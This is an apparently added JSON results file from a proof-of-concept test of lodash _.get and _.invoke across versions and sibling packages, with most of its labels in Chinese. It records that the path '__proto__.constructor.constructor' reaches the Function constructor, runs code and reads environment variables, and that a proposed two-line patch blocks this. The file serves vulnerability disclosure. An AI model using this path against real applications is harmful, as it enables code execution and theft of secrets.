@@ -1,0 +1,468 @@
+{
+  "generated_at": "2026-11-02T10:49:27.652Z",
+  "node": "v22.22.2",
+  "platform": "win32-x64",
+  "env_marker": "VHV_POC_MARKER",
+  "forms": [
+    {
+      "id": "main:get",
+      "label": "lodash@4.18.1（主包） — _.get",
+      "note": "npm i lodash —— 206,478,795 次/周",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "HIT",
+          "detail": "got: function Function() { [native code] }"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "main:invoke",
+      "label": "lodash@4.18.1（主包） — _.invoke",
+      "note": "npm i lodash —— 206,478,795 次/周",
+      "api": "invoke",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "数组 path 读取（invoke 语义为调用，不适用）",
+          "result": "N/A"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ],
+      "extra": {
+        "getter_write": "HIT"
+      }
+    },
+    {
+      "id": "sibling-get",
+      "label": "lodash.get@4.4.2（兄弟包，独立发版）",
+      "note": "npm i lodash.get —— 22,320,171 次/周，最后一次发版 2016-08",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "HIT",
+          "detail": "got: function Function() { [native code] }"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "sibling-invoke",
+      "label": "lodash.invoke@4.5.2（兄弟包，独立发版）",
+      "note": "npm i lodash.invoke —— 33,215 次/周",
+      "api": "invoke",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "数组 path 读取（invoke 语义为调用，不适用）",
+          "result": "N/A"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ],
+      "extra": {
+        "getter_write": "HIT"
+      }
+    },
+    {
+      "id": "es",
+      "label": "lodash-es@4.18.1（ESM 构建）",
+      "note": "npm i lodash-es —— 69,172,346 次/周",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "HIT",
+          "detail": "got: function Function() { [native code] }"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "es:invoke",
+      "label": "lodash-es@4.18.1（ESM 构建） — invoke",
+      "note": "npm i lodash-es —— 69,172,346 次/周",
+      "api": "invoke",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "数组 path 读取（invoke 语义为调用，不适用）",
+          "result": "N/A"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "subpath-get",
+      "label": "lodash/get@4.18.1（子路径，随主包发版）",
+      "note": "require(\"lodash/get\")",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "HIT",
+          "detail": "got: function Function() { [native code] }"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "legacy-4.17.20:get",
+      "label": "lodash@4.17.20（2020-08，CVE-2020-8203 的修复版本） — _.get",
+      "note": "version 4.17.20",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "HIT",
+          "detail": "got: function Function() { [native code] }"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "legacy-4.17.20:invoke",
+      "label": "lodash@4.17.20（2020-08，CVE-2020-8203 的修复版本） — _.invoke",
+      "note": "version 4.17.20",
+      "api": "invoke",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "数组 path 读取（invoke 语义为调用，不适用）",
+          "result": "N/A"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "legacy-4.18.0:get",
+      "label": "lodash@4.18.0（4.18.1 的前一版） — _.get",
+      "note": "version 4.18.0",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "HIT",
+          "detail": "got: function Function() { [native code] }"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "legacy-4.18.0:invoke",
+      "label": "lodash@4.18.0（4.18.1 的前一版） — _.invoke",
+      "note": "version 4.18.0",
+      "api": "invoke",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "数组 path 读取（invoke 语义为调用，不适用）",
+          "result": "N/A"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "HIT"
+        },
+        {
+          "id": "A3_code_exec",
+          "desc": "执行 'return process.version'",
+          "result": "HIT",
+          "detail": "executed, returned v22.22.2"
+        },
+        {
+          "id": "A4_read_env",
+          "desc": "读取 set 到 process.env 的标记变量",
+          "result": "HIT",
+          "detail": "executed, got poc-89e18e1c"
+        }
+      ]
+    },
+    {
+      "id": "patched:get",
+      "label": "lodash@4.18.1 + 本报告建议的 2 行修复（反事实对照组） — _.get",
+      "note": "version 4.18.1",
+      "api": "get",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "_.get({}, ['__proto__','constructor','constructor'])",
+          "result": "MISS(undefined)",
+          "detail": ""
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "MISS(undefined)"
+        },
+        {
+          "id": "A3_code_exec",
+          "result": "ERR(F is not a function)"
+        },
+        {
+          "id": "A4_read_env",
+          "result": "ERR(F is not a function)"
+        }
+      ]
+    },
+    {
+      "id": "patched:invoke",
+      "label": "lodash@4.18.1 + 本报告建议的 2 行修复（反事实对照组） — _.invoke",
+      "note": "version 4.18.1",
+      "api": "invoke",
+      "assertions": [
+        {
+          "id": "A0_control",
+          "desc": "对照组：正常 path 取值仍然正确",
+          "result": "PASS"
+        },
+        {
+          "id": "A1_read_Function",
+          "desc": "数组 path 读取（invoke 语义为调用，不适用）",
+          "result": "N/A"
+        },
+        {
+          "id": "A2_read_strpath",
+          "desc": "字符串 path \"__proto__.constructor.constructor\"",
+          "result": "MISS(undefined)"
+        },
+        {
+          "id": "A3_code_exec",
+          "result": "ERR(fn(...) is not a function)"
+        },
+        {
+          "id": "A4_read_env",
+          "result": "ERR(fn(...) is not a function)"
+        }
+      ]
+    }
+  ]
+}
